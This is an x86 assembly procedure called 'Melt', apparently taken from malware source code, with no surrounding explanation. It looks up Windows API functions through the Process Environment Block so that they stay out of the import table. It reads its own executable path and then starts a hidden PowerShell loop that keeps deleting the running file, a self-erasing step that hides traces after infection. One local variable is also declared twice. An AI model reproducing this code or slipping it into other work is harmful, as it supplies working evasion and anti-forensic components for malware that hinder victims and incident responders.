proc Melt
	local	ExecutablePath[MAX_PATH + 1]:WORD
	local	Verb[10]:WORD
	local	FileName[50]:WORD
	local	Arguments[MAX_PATH + 1]:WORD
	local	Arguments[MAX_PATH + 1]:WORD

	; Get executable filename
	lea		eax, [ExecutablePath]
	pebcall	PEB_Kernel32Dll, PEB_GetModuleFileNameW, NULL, eax, MAX_PATH
	cmp		eax, 0
	jle		.ret

	; Verb: "open"
	lea		eax, [Verb]
	lodstrw	'open'

	; Filename: "powershell"
	lea		eax, [FileName]
	lodstrw	'powershell'

	; Load arguments part 1
	lea		eax, [Arguments]
	lodstrw	'$file='''

	; Append executable filename to arguments
	lea		eax, [Arguments]
	lea		ebx, [ExecutablePath]
	pebcall	PEB_Kernel32Dll, PEB_lstrcatW, eax, ebx

	; Append arguments part 2
	lea		eax, [Arguments]
	pebcall	PEB_Kernel32Dll, PEB_lstrlenW, eax
	lea		eax, [Arguments + eax * 2]
	lodstrw	''';for($i=1;$i -le 600 -and (Test-Path $file -PathType leaf);$i++){Remove-Item $file;Start-Sleep -m 100}'

	; Execute
	lea		eax, [Verb]
	lea		ebx, [FileName]
	lea		ecx, [Arguments]
	pebcall	PEB_Shell32Dll, PEB_ShellExecuteW, NULL, eax, ebx, ecx, NULL, SW_HIDE

.ret:
	xor		eax, eax
	ret
endp